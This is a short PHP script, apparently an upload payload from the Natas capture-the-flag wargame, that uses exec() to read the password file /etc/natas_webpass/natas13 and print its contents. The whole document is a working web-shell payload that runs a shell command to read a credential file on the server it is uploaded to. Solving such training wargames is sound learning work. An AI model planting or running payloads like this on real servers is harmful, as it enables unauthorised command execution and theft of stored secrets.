<?php

    exec("cat /etc/natas_webpass/natas13", $output);
    print_r($output[0]);

?>